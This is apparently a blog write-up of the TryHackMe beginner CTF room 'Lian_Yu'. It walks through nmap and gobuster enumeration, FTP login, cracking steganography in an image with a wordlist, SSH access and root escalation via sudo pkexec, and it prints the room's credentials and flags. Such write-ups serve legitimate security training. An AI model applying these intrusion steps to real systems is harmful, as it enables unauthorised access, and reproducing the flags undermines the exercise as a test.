---
title: "Lian_Yu - TryHackMe"
author: Ludovic COULON
date: 2020-05-24
hero: ./images/hero.jpeg
excerpt: "Writeup for the Lian_Yu on TryHackMe"
---

[TryHackMe | Lian_Yu](https://tryhackme.com/room/lianyu)

Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.

### Setup

```bash
➜  TryHackMe nmap -A -vv http://10.10.186.62/
```

```bash
21/tcp  open  ftp     syn-ack vsftpd 3.0.2

22/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T+pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV+d35X8CTUM882eJX+t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k+fnkLzX74fONcAEqseZDOffn5bxS+nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv+hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A+HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg==
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww+oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd+70Rul+G7Ch0uzextmZh7756/VrqKn+rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z+EfuCAfvMe0hxtrbHlb+VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini+VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l+/xEkXPxZ
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2+e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf+QRtxvjnqRg=
|   256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn

80/tcp  open  http    syn-ack Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Purgatory

111/tcp open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34339/udp6  status
|   100024  1          48713/tcp6  status
|   100024  1          59046/tcp   status
|_  100024  1          60215/udp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### #1 Deploy the VM and Start the Enumeration.

```bash
No anwser needed
```

### #2 What is the Web Directory you found?

```bash
➜  TryHackMe gobuster dir -u http://10.10.186.62/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
➜  TryHackMe gobuster dir -u http://10.10.186.62 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.186.62
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 16:49:28 Starting gobuster
===============================================================
/island (Status: 301)
```

<div className="Image__Medium">
  <img src="https://imgur.com/0VaxEaE.png" alt="blog_image" />
</div>

```bash
Maybe a username there ? vigilante
```

```bash
➜  ~ gobuster dir -u http://10.10.186.62/island -w /usr/share/SecLists/Fuzzing/4-digits-0000-9999.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.186.62/island
[+] Threads:        10
[+] Wordlist:       /usr/share/SecLists/Fuzzing/4-digits-0000-9999.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 16:49:51 Starting gobuster
===============================================================
/2100 (Status: 301)
```

### #3 What is the file name you found?

<div className="Image__Medium">
  <img src="https://imgur.com/Ag4l7Wa.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/WTNHeLV.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/Y3hPnnK.png" alt="blog_image" />
</div>

```bash
With the hint given by the comment let's try the name of the hero on the web-serie
and add at the end .ticket
```

### #4 What is the FTP Password?

```bash
green_arrow.ticket
```

Nice ! It worked !

<div className="Image__Medium">
  <img src="https://imgur.com/Rac75Ov.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/IOABU0H.png" alt="blog_image" />
</div>

[CyberChef](<https://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)&input=UlR5OHloQlFkc2NY>)

Let's try to log with the credentials that we discovered

```bash
➜  TryHackMe ftp 10.10.186.62
Connected to 10.10.186.62.
220 (vsFTPd 3.0.2)
Name (10.10.186.62:kali): vigilante
331 Please specify the password.
Password: !#th3h00d
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 .
drwxr-xr-x    4 0        0            4096 May 01 05:38 ..
-rw-------    1 1001     1001           44 May 01 07:13 .bash_history
-rw-r--r--    1 1001     1001          220 May 01 05:38 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01 05:38 .bashrc
-rw-r--r--    1 0        0            2483 May 01 07:07 .other_user
-rw-r--r--    1 1001     1001          675 May 01 05:38 .profile
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
226 Directory send OK.
ftp>
```

```bash
ftp> get .other_user
local: .other_user remote: .other_user
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .other_user (2483 bytes).
226 Transfer complete.
2483 bytes received in 0.00 secs (663.2398 kB/s)
ftp> exit
221 Goodbye.

➜  TryHackMe cat .other_user
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.
```

Nothing very interesting there let's see if there is some stenography in those files.

After some time I used the tool called "Stegcracker" and it worked !

[Paradoxis/StegCracker](https://github.com/Paradoxis/StegCracker)

```bash
➜  TryHackMe /home/kali/.local/bin/stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.0.8 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: password
Tried 4 passwords
Your file has been written to: aa.jpg.out
password
```

The password for the aa.jpg is password let's steghide extract now :D

```bash
➜  TryHackMe steghide extract -sf aa.jpg
Enter passphrase:
wrote extracted data to "ss.zip".
➜  TryHackMe unzip ss.zip
Archive:  ss.zip
  inflating: passwd.txt
  inflating: shado
➜  TryHackMe cat passwd.txt
This is your visa to Land on Lian_Yu
# Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

➜  TryHackMe cat shado
M3tahuman
```

### #5 What is the file name with SSH password?

```bash
The file of the ssh password is the file we extract on the aa.jpg
"shado"
```

### #6 User.txt

Let's connect on the machine using the credentials that we extracted.

```bash
The username is Slade the username is the first username on the .other_user
on the ftp that we downloaded earlier
```

```bash
Creds :
slade:M3tahuman
```

```bash
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak
```

### #7 Root.txt

```bash
slade@LianYu:~$ sudo -l
[sudo] password for slade:
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

[Ubuntu Manpage: pkexec - Execute a command as another user](http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html)

> pkexec - Execute a command as another user

```bash
slade@LianYu:~$ sudo pkexec ls /root/
root.txt
slade@LianYu:~$ sudo pkexec cat /root/root.txt
                          Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.

THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/kUD3W5P.png" alt="TryhackMeProfile" />
  </a>
</center>
